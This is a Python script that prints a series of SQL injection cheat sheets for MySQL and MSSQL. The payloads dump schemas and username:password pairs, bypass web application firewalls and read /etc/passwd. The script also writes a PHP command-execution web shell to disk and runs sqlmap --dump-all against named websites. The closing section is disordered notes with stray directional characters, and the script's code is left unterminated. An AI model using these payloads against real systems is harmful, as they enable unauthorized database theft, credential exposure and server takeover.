#!/usr/bin/python3
# Console colors
bg ='' # '\033[44m'  # gray
W = bg+'\033[0m'  # white (normal)
R = bg+'\033[31m'  # red
G = bg+'\033[32m'  # green
O = bg+'\033[33m'  # orange
B = bg+'\033[34m'  # blue
P = bg+'\033[35m'  # purple
C = bg+'\033[36m'  # cyan
GR = bg+'\033[37m'  # gray

try:
    from threading import Thread
    import sqlite3
    import urllib.parse
    import os,time,sys
    from datetime import datetime
    now = datetime.now()   


 
except ImportError as e:
    print(R+'[!] Module %s not found install it ... '%str(e).split()[-4])
    exit()


clear = lambda: os.system('clear')
note=O+"""
-|----------------------------------------------------------------------------|-
 |: Using Apostrophe [']
 |: Using Quotation mark [?]
 |: Using English Alphabet [A]
 |: Using Single Quote / Quotation mark / English Alphabet {['],[?],[A]}
 |: add Point before the variable number and add Apostrophe after it [.x']
 |: add Point before and after variable number at the same time  [.x.]
 |: Add the Apostrophe before the variable number  [']
 |: Delete the variable number and add the Apostrophe only [']
 |: Delete the variable number and add a slash  [/]
 |: Using Logical expressions  [and 1=1]
-|----------------------------------------------------------------------------|-

"""

clear()
print(note)


input("[Pres Enter]")
clear()

check_version=O+"""
----------------------------------------------------------------------------
 AND MID(VERSION(),1,1) = '3';
 AND MID(VERSION(),1,1) = '4';
 AND MID(VERSION(),1,1) = '5';
----------------------------------------------------------------------------
 and substring(version(),1,1)=3
 and substring(version(),1,1)=4
 and substring(version(),1,1)=5
----------------------------------------------------------------------------
 and substring(version(),1,1)=8
 and substring(version(),1,1)=9
 and substring(version(),1,1)=10
----------------------------------------------------------------------------
 and substring(Version(),1,1)like(3)
 and substring(Version(),1,1)like(4)
 and substring(Version(),1,1)like(5)
 and substring(Version(),1,1)not in(4,3)
 and substring(Version(),1,1)in(4,3)
----------------------------------------------------------------------------
"""
print(check_version)


note2=O+"""
cat=.1 and 1=1 -- -
----------------------------------------------------------------------------
cat=.2 order by 10 -- -
----------------------------------------------------------------------------
cat= 3-.1GROUPBY1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 asc
----------------------------------------------------------------------------
cat=.4 union select version(),2-- -
----------------------------------------------------------------------------
cat=.5 union select table_name,2       froM+InfORmaTion_scHema.tAblES -- -
----------------------------------------------------------------------------
cat=.6 union select table_name,2       froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
cat=.7 union select group_concat(table_name),2      froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
http://www.waraxe.us/sql-char-encoder.html
----------------------------------------------------------------------------
cat=.8 union select group_concat(column_name),2+froM+InfORmaTion_scHema.cOlumnS WheRe+tAblE_naMe=0x6d656d626572 -- -
----------------------------------------------------------------------------
cat=.9 union select group_concat(username,0x3a,password),2 from member -- -
----------------------------------------------------------------------------
"""



clear()
print(note2)


input("[Pres Enter]")
clear()


level1=G+"""

order by 100 -- -
----------------------------------------------------------------------------
union select 1,2,3,4,5,6,7,8,9,10,version() -- -
----------------------------------------------------------------------------
union select 1,2,table_name, froM InfORmaTion_scHema.tAblES  -- -
----------------------------------------------------------------------------
union select table_name froM InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
union select group_concat(table_name) froM InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
#http://www.waraxe.us/sql-char-encoder.html
----------------------------------------------------------------------------
union select group_concat(column_name) froM InfORmaTion_scHema.cOlumnS WheRe tAblE_naMe=0x6c6f63616c5f61726561 -- -
----------------------------------------------------------------------------
union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- - 
----------------------------------------------------------------------------
"""


clear()
print(level1)

input("[Pres Enter]")
clear()

level2=W+"""
----------------------------------------------------------------------------
DIOS START #start normal
--------------------------------------------------------------------------------------------------------------------------
(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x2e,table_name,0x3a,column_name))))x)
--------------------------------------------------------------------------------------------------------------------------
#__TA__ #__C1__#__C2__
----------------------------------
(select(@) from (select (@:=0x00),(select (@) from (__TA__) where (@) in (@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS2 #start normal
--------------------------------------------------------------------------------------------------------------------------
concat( @n_d:=0x00,@i:=0x00,@o:=0x00,if( benchmark( (select count(*) from information_schema.schemata), @o:=CONCAT(@o,(Select concat( 0x266e6273703b,LPAD(@n_d:=@n_d%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d7265643e3c623e,@i:=schema_name,0x3c2f623e20286e756d626572206f66207461626c657320696e2064617461626173653a20,@NumberOfDatabases:=(select count(*) from information_schema.tables where table_schema=@i),0x293c2f666f6e743e,0x3c62723e,
concat(@n_t:=0x00,@tbl:=0x00,@out_tbl:=0x00,if( benchmark( @NumberOfDatabases,@out_tbl:=CONCAT( @out_tbl,( Select concat( repeat(0x266e6273703b,8),LPAD(@n_t:=@n_t%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d677265656e3e3c623e,@tbl:=table_name,0x3c2f623e20286e756d626572206f6620636f6c756d6e7320696e207461626c653a20,@NumberOfColumns:=(select count(*) from information_schema.columns where table_schema=@i and table_name=@tbl),0x293c2f666f6e743e,concat( @n_c:=0x00,@clm:=0x00,@clm_out:=0x00,if( benchmark( @NumberOfColumns,@clm_out:=CONCAT( @clm_out,0x3c62723e,repeat(0x266e6273703b ,16),LPAD(@n_c:=@n_c%2b1,3,0x30),0x2e20203c666f6e7420636f6c6f723d626c75653e,(Select (@clm:=column_name) from information_schema.columns where (table_name=@tbl) and column_name>@clm order by column_name LIMIT 1),0x3c2f666f6e743e))=0, @clm_out, 0x00), 0x3c62723e)) from information_schema.tables where table_schema=@i and table_name>@tbl order by table_name LIMIT 1)))=0, @out_tbl, 0x00))) from information_schema.schemata where schema_name>@i order by schema_name LIMIT 1)))=0,@o,0x00))
--------------------------------------------------------------------------------------------------------------------------
concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a656374656420627920426c61436b20526f7365205b4748545d3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=database())and@:=concat/**/
(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)

--------------------------------------------------------------------------------------------------------------------------
#__TA__ #__C1__#__C2__
----------------------------------
(/*!50000select*/(@) /*!50000from*/ (/*!50000select*/ (@:=0x00),(/*!50000select*/ (@) /*!50000from*/ (__TA__) /*!50000where*/ (@) in
(@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)"""


clear()
print(level2)

input("[Pres Enter]")


level2a=W+"""--------------------------------------------------------------------------------------------------------------------------
# direct DIOS2 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------
Concat(0x2e2e4e616d65203a3a3a3a3a3a3a3a3a3a2050697368696361745f496e6a6563746f72,0x3c62723e,0x2e2e56657273696f6e203a3a3a3a3a3a3a20,@@`version`,0x3c62723e,0x2e2e55736572203a3a3a3a3a3a3a3a3a3a20,current_user(),0x3c62723e,0x2e2e4461746162617365203a3a3a3a3a3a20,database(),0x3c62723e,0x2e2e404064617461646972203a3a3a3a3a20,@@datadir,0x3c62723e,0x2e2e53796d6c696e6b203a3a3a3a3a3a3a20,@@HAVE_SYMLINK,0x3c62723e,0x2e2e486f7374204e616d65203a3a3a3a3a20,@@HOSTNAME,0x3c62723e,0x2e2e46696c652053797374656d203a3a3a20,@@CHARACTER_SET_FILESYSTEM ,0x3c62723e,0x2e2e426974732044657461696c73203a3a20,@@VERSION_COMPILE_MACHINE,0x3c62723e,0x2e2e546d70446972203a3a3a3a3a3a3a3a20,@@tmpdir,0x3c62723e,0x2e2e506f7274203a3a3a3a3a3a3a3a3a3a20,@@port,0x3c62723e,0x3c62723e,0x2e2e44696f73203a3a20,0x3c62723e,0x3c62723e,(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_schema,0x203a3a20,table_name,0x203a3a20,column_name,0x3c62723e))))a))
--------------------------------------------------------------------------------------------------------------------------
#__TA__ ~~ __C1__~~ __C2__
----------------------------------
(select(@) from (select (@:=0x00),(select (@) from (table) where (@) in (@:=concat(@,0x0a,column1,0x3a,column2))))a)
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS3 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------
/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a65637465642062792041686d656420456c204d656c656779203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select (@x) /*!00000from*/ (select (@x:=0x00),(select (0) /*!00000from*/ (information_schema/**/.columns)where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
--------------------------------------------------------------------------------------------------------------------------
"""



clear()
print(level2a)

input("[Pres Enter]")
clear()


level2b="""
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS4 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------
/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a65637465642062792041686d656420456c204d656c656779203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select(@x)/*!00000from*/(select(@x:=0x00),(select(0)/*!00000from*/(information_schema/**/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS5 #start normal get all data 
--------------------------------------
concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x3c62723e,0x7e7e696e6a65637420627920426c61436b526f73654748547e7e3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e64617461626173653d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,database(),0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e76657273696f6e3d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,version(),0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e757365723d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,user(),0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e506f72743d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,@@port,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4f533d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,@@version_compile_os,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e424954532044455441494c533d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d626c75653e,@@version_compile_machine,0x3c666f6e7420636f6c6f723d677265656e3e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e46494c452053595354454d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,@@CHARACTER_SET_FILESYSTEM,0x3c2f666f6e743e,0x3c62723e,0x3c62723e,0x686f73746e616d653d3d,@@hostname,0x3c62723e,0x53797374656d2075756964206b65793d3d,UUID(),0x3c62723e,0x73796d6c696e6b3d3d,@@GLOBAL.have_symlink,0x3c62723e,0x53534c3d3d,@@GLOBAL.have_ssl,0x3c62723e,0x426173656469726563746f72793d3d,@@basedir)"""

clear()
print(level2b)

input("[Pres Enter]")
clear()



level2c="""

--------------------------------------------------------------------------------------------------------------------------
# direct DIOS5 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------

(sElect(@x)from(Select(@x:=0x00),(sElect(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x3a,table_name,0x3a,column_name))))x)

--------------------------------------------------------------------------------------------------------------------------
(sElect(@x)from(Select(@x:=0x00), (@running_number:=0),(sElect(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,(@running_number:=@running_number%2b1),0x2e20,table_schema,0x3a,table_name,0x3a,column_name))))x)

--------------------------------------------------------------------------------------------------------------------------

https://www.validcreditcardnumber.com/
--------------------------------------------------------------------------------------------------------------------------"""


clear()
print(level2c)

input("[Pres Enter]")
clear()




level2d="""
--------------------------------------------------------------------------------------------------------------------------
Pass Detection # CASE statement
--------------------------------------------------------------------------------------------------------------------------
(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select CASE WHEN ( (select  count(*) from information_schema.columns where table_name=@tbl and  column_name like 0x257061737325)>0) THEN  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a2070617373202a2a2a203c2f623e3c666f6e7420636f6c6f723d626c75653e else 0x00 END)))))x) 
--------------------------------------------------------------------------------------------------------------------------
IF() function
-------------------------------------------------------------------------------------------------------------------------- 
(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select IF(( select count(*)  from information_schema.columns where table_name=@tbl and column_name  like 0x257061737325 >0),  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a2070617373202a2a2a203c2f623e3c666f6e7420636f6c6f723d626c75653e, 0x00))))))x)
--------------------------------------------------------------------------------------------------------------------------"""


clear()
print(level2d)

input("[Pres Enter]")
clear()





error_based="""
input("[Pres Enter]")
--------------------------------------------------------------------------------------------------------------------------
                                                error_based
--------------------------------------------------------------------------------------------------------------------------
: Version :
 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1-- -
 --------------------------------------------------------------------------------------------------------------------------
: Tables 
~~ __limit xxx,1__~~ 
----------------------------------
 or 1 group by concat_ws(0x7e,(select table_name from information_schema.tables ​where table_schema=database() limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
 --------------------------------------------------------------------------------------------------------------------------
: Columns 
-------------------
~~ __T.Hex__~~
----------------------------------
 or 1 group by concat_ws(0x7e,(select column_name from information_schema.column​s where table_name=__T.Hex__ limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
 --------------------------------------------------------------------------------------------------------------------------
: Getting Data From The Columns
 --------------------------------------------------------------------------------------------------------------------------
 #__TA__ ~~ __C1__~~ __C2__
----------------------------------
 or 1 group by concat_ws(0x7e,(select concat(__C1__,0x7e,__C2__) from __TA__ limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
--------------------------------------------------------------------------------------------------------------------------

"""


clear()
print(error_based)
input("[Pres Enter]")

clear()
xpath_Injection="""
input("[Pres Enter]")
--------------------------------------------------------------------------------------------------------------------------
                                                xpath Injection
--------------------------------------------------------------------------------------------------------------------------
: version 
 
 and extractvalue(rand(),concat(0x7e,version()))-- - 
 --------------------------------------------------------------------------------------------------------------------------
: Tables :
~~ __limit 0,1__~~
----------------------------------
 and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
 --------------------------------------------------------------------------------------------------------------------------
: column :
-------------------
~~ __T.Hex__~~
---------------------------------- 
and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
 
 and extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=__T.Hex__ limit 0,1)))-- - 
 --------------------------------------------------------------------------------------------------------------------------

: Data :
--------------------------------------------------------------------------------------------------------------------------
  #__TA__ ~~ __C1__~~ __C2__
----------------------------------

 and extractvalue(rand(),concat(0x7e,(select concat( __C1__,0x7e,__C2__) from __TA__ limit 0,1)))-- -
--------------------------------------------------------------------------------------------------------------------------
* note remove any buk code  T&#8203;ABLENAME 
--------------------------------------------------------------------------------------------------------------------------

 """





clear()
print(xpath_Injection)
input("[Pres Enter]")

clear()


xpath_UpdateXML="""
--------------------------------------------------------------------------------------------------------------------------
                                               xpath UpdateXML
--------------------------------------------------------------------------------------------------------------------------
#version
and updatexml(0x7e,concat(0x7e,(version())),0)--
and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/ version()),0x7e),1)
--------------------------------------------------------------------------------------------------------------------------
 
: Getting The Tables (UpdateXML)
--------------------------------------------------------------------------------------------------------------------------
 ~~ __limit 0,1__~~
----------------------------------
 and updatexml(0x7e,concat(0x7e,((select concat(table_name) from information_sch​ema.tables where table_schema=database() limit 0,1))),0)--
 -------------------------------------------------------------------------------------------------------------------------- 
:  Getting Columns (UpdateXML)
--------------------------------------------------------------------------------------------------------------------------
~~ __T.Hex__~~
 ----------------------------------
 and updatexml(0x7e,concat(0x7e,((select concat(column_name) from information_sc​hema.columns where table_name=~~ __T.Hex__~~ limit 0,1))),0)--
 --------------------------------------------------------------------------------------------------------------------------
:  Getting Data (UpdateXML)
 --------------------------------------------------------------------------------------------------------------------------
   #__TA__ ~~ __C1__~~ __C2__
----------------------------------

 and updatexml(0x7e,concat(0x7e,((select concat(__C1__,0x7e​,__C2__) from __TA__ limit 0,1))),0)--
 --------------------------------------------------------------------------------------------------------------------------
"""


clear()
print(xpath_UpdateXML)
input("[Pres Enter]")

clear()



DOUBLE_Query_Injection="""
--------------------------------------------------------------------------------------------------------------------------
                                                DOUBLE Query Injection's
--------------------------------------------------------------------------------------------------------------------------
: version
 
 and(select 1 from(select count(*),concat((select (select concat(version())) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 --------------------------------------------------------------------------------------------------------------------------
: Getting The DataBase  
 
 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 -------------------------------------------------------------------------------------------------------------------------- 
: Getting The Tables
--------------------------------------------------------------------------------------------------------------------------   
  ~~ __DB.Hex__~~
----------------------------------
 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(table_name),0x27,0x7e) from information_schema.tables where table_schema=__DB.Hex__limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 --------------------------------------------------------------------------------------------------------------------------
: Getting The Columns  
--------------------------------------------------------------------------------------------------------------------------
 ~~ __DB.Hex__~~ || ~~__TA__ ~~
---------------------------------- 
 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns Where table_schema=__DB.Hex__ AND table_name=__TA__ LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 --------------------------------------------------------------------------------------------------------------------------
: Dump Data   
--------------------------------------------------------------------------------------------------------------------------
 ~~ __DB__~~ || ~~__TA__ ~~  ~~ __C1__~~ __C2__
----------------------------------
and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(__TA__.__C1__ as char),0x27,0x7e,cast(__TA__.__C2__ as char)) FROM `__DB__`.__TA__ LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1

"""



clear()
print(DOUBLE_Query_Injection)
input("[Pres Enter]")

clear()


ASPX_Site="""
--------------------------------------------------------------------------------------------------------------------------
							Begin Declare The DIOS For ASPX Site
--------------------------------------------------------------------------------------------------------------------------
The DIOS Table
 --------------------------------------------------------------------------------------------------------------------------
;begin declare @x varchar(8000),@y int,@z varchar(50),@a varchar(100) declare @myTbl table (name varchar(8000) not null)SET @y=1 SET @x='injected by Me :: '+@@version+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Database : '+db_name()+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl)select @a=@a + column_name+' : 'from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x +CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Table: '+@z+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Columns : '+@a+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)SET @y = @y+1 end select @x as output into BlackRose END--
--------------------------------------------------------------------------------------------------------------------------
 -------------------------------------------------------------------------------------------------------------------------
OutPut Data
----------------------------------->
 and 1=convert(int,(select top 1 output from BlackRose))--
--------------------------------------------------------------------------------------------------------------------------

 select output  from BlackRose
--------------------------------------------------------------------------------------------------------------------------
 """



clear()
print(ASPX_Site)
input("[Pres Enter]")


#---------------------------------------------------------------
#part 3 waf
#---------------------------------------------------------------


Not_Acceptable_Forbidden="""
--------------------------------------------------------------------------------------------------------------------------
//Not Acceptable // Forbidden
--------------------------------------------------------------------------------------------------------------------------


/*!50000Union*/  SeLEct


Union /*!50000SeLEct*/

/*!50000UnIoN*/ /*!50000SeLeCt*/

/*!50000 */   
/*!40000 */
/*!30000 */

/*!12345 */
/*!41320 */
/*!32302 */

union distinct select
union distinctROW select
--------------------------------------------------------------------------------------------------------------------------
"""


clear()
print(Not_Acceptable_Forbidden)
input("[Pres Enter]")





alpha=""" 
--------------------------------------------------------------------------------------------------------------------------
The used SELECT statements have a different number of columns
--------------------------------------------------------------------------------------------------------------------------
this mean you can not use (union select )
--------------------------------------------------------------------------------------------------------------------------

+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1--
--------------------------------------------------------------------------------------------------------------------------

or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1--

--------------
{ cll } mean windows system

"""

clear()
print(alpha)
input("[Pres Enter]")





bravo="""
*************************************************************
illegal mix of collations
**************************************

convert(value using xxxx)
--------------------------------------------------------------------------------------------
convert(group concat (mysites) ascii)

--------------------------------------------------------------------------------------------
unhex(hex(value))

--------------------------------------------------------------------------------------------
cast(value as char)
--------------------------------------------------------------------------------------------
uncompress(compress(version()))
--------------------------------------------------------------------------------------------
cast(value as char)
--------------------------------------------------------------------------------------------
aes_decrypt(aes_encrypt(value,1),1)
--------------------------------------------------------------------------------------------
binary(value)
======================================================================================================
ascii,ujis,ucs2,tis620,swe7,sjis,macroman,macce,latin7,latin5,latin2,koi8u,koi8r,keybcs2,hp8,geostd8,gbk,gb2132,armscii8,ascii,cp1250,big5,cp1251,cp1256,cp1257,cp850,cp852,cp866,cp932,dec8,euckr,latin1,utf8


======================================================================================================
## The connection was reset##
======================================================================================================


?id=2-

?id=2-.1

?id=2-.1union select

--------------------------------------------------------------------------------------------"""







clear()
print(bravo)
input("[Pres Enter]")

















#example="www.asfaa.org/members.php?id=1"

sqlmap="""
sqlmap -u websiteexample --level 4 --risk 3 --dbms=mysql -p id --batch --dbs
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id --batch --dump-all
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id --batch -D secret --table
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id --batch -D secret -T users --column
sqlmap -u websiteexample --level 4 --risk 3 dbms=mysql -p your_id -D secret -T users --dump

--------------------------------------------------------------------------------------------------------------------------
"""








extra='''

"inurl:."/index.php?cat=7"/"com"/"de" "

--------------------------------------------------------------------------------------------------------------------------

select version() ;
select user() ;
select load_file('/etc/passwd') ;
select load_file('/etc/apache2/sites-enabled/000-default.conf') ;
/opt/lampp/htdocs
<?php system($_REQUEST["cmd"])?>
select 1 ,'<?php system($_REQUEST["cmd"])?>' into outfile '/home/cetrix/Desktop/2.php';
select 1,concat(version (),"a");
column_name from information_schema.columns where table.schema="stars"
 ?id=1' order by 1,2--+
 ?id=1' union select 1,2--+
 ?id=1' union select database(),version()--+
 ?id=1' union select table_name from information_schema.tables--+
 ?id=1' union select 1,column_name from information_schema.columns where table_name=char(117,115,101,114,115)--+
 ?id=1' union select user,password from users--
 

 select user() ;

 select 1 ,'<?php system($_REQUEST["cmd"])?>' into outfile '/tmp/2.php';
 select 1 ,'<?php system(["pwd"])?>' into outfile '/tmp/2.php';

 select auto_increment from information_Schema.tables ;

SELECT concat(Auto_Increment,'<br>',group_concat(table_name,'<br>' Separator 0x20)) from information_Schema.tables where auto_increment=1;

SELECT auto_increment,table_name from information_Schema.tables;






-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
' OR '1'='1' –
' OR '1'='1' /*
-- MySQL
' OR '1'='1' #
-- Access (using null characters)
' OR '1'='1' %00
' OR '1'='1' %16





sqlmap -u www.balabas.com.ua/buy.php?cat=1 --level 4 --risk 3 dbms=mysql -p cat --batch --dump-all





https://github.com/certix7/sqllite/blob/main/databases_FingerPrint



‫‪SQL‬‬ ‫‪Injection‬‬ ‫‪Closures‬‬ ‫‪Technic‬‬ ‫‪


‫http://www.InjectorBoy.GHT?id=1‬‬) ‫‪order‬‬ ‫‪by‬‬ ‫‪100--‬‬ ‫‪-‬‬


‫•‬ ‫‪D.I.V‬‬ ‫‪Injection‬‬ 

‫‪http://www.InjectorBoy.GHT?id=1,1‬‬


‫http://www.InjectorBoy.GHT?id=1,version‬‬()


‫•‬ ‫‪Hidden‬‬ ‫‪Vlun‬‬ ‫‪

‫‪www.Ahmed-El-Melegy.be/files/download/6.pdf‬‬

‫‪Ahmed-El-Melegy.be/files/download/6'.pdf‬‬

‫‪www.Ahmed-El-Melegy.be/files/download@/6'.pdf‬‬

‫
‫‪Update‬‬ ‫‪Statement‬‬ ‫‪Code‬‬
‫'*)‪'*updatexml(1,concat(0x1,version()),1‬‬
‫
‫‪www.Ahmed-El-Melegy.be/files/download@/6'*updatexml(1,concat(0x1,version()),1)*'.pdf‬‬




----------------------
7
-------------------
http://xxxxxxxxxxxxxxxxxxxx/products.php?cat=.4 group by 1,2 -- -



 select *  from sites PROCEDURE ANALYSE() ;



